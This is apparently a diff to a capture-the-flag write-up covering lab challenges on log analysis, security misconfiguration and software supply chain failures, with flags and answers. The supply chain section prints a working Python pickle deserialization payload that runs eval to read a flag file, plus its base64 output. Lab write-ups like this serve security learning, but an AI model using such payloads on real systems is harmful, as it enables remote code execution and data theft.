@@ -38,25 +38,27 @@ Answer: 203.0.113.45
 2.Looks like they were able to gain access to an account! What is the username associated with that account?
 
 Answer: admin
-# AS02: Security Misconfigurations
-Challenge : http://10.49.154.138:5002
-
-
-<img width="1578" height="418" alt="image" src="https://github.com/user-attachments/assets/d074e4cc-f8fc-437a-bf80-73e486d9799b" />
-
 
 3.What action did the attacker try to do with the account? List the endpoint the accessed.
 
 Answer: /supersecretadminstuff
 
 # Application Design Flaws-ROOM (2)
+
 ## AS02: Security Misconfigurations
+
 Challenge : http://10.49.154.138:5002
+
 <img width="1578" height="418" alt="image" src="https://github.com/user-attachments/assets/fe3bfc8a-ec8b-4ab6-a9ab-33edc30e94c4" />
+
 we can give /api/user/admin or any aplhabets (guesssing normal and common directries)
+
 <img width="702" height="289" alt="image" src="https://github.com/user-attachments/assets/b6bc692e-2d47-4992-8610-9a4a9f1d1b63" />
+
 Flag: THM{V3RB0S3_3RR0R_L34K}
+
 # AS03: Software Supply Chain Failures
+
 Challenge : http://10.49.154.138:5003
 
 Python file they given to us
@@ -153,11 +155,13 @@ class Malicious:
         # This will execute: open('flag.txt').read()
         return (eval, ("open('flag.txt').read()",))
 
-# Generate and encode the payload
+       # Generate and encode the payload
 payload = pickle.dumps(Malicious())
 encoded = base64.b64encode(payload).decode()
 print(encoded)
+
 OUTPUT OF THE CODE :gASVMwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwXb3BlbignZmxhZy50eHQnKS5yZWFkKCmUhZRSlC4=
+
 <img width="1003" height="783" alt="image" src="https://github.com/user-attachments/assets/bc7230b0-f8c6-4d2e-a482-3a94556b3d93" />
 
 Flag:THM{INSECURE_DESERIALIZATION}
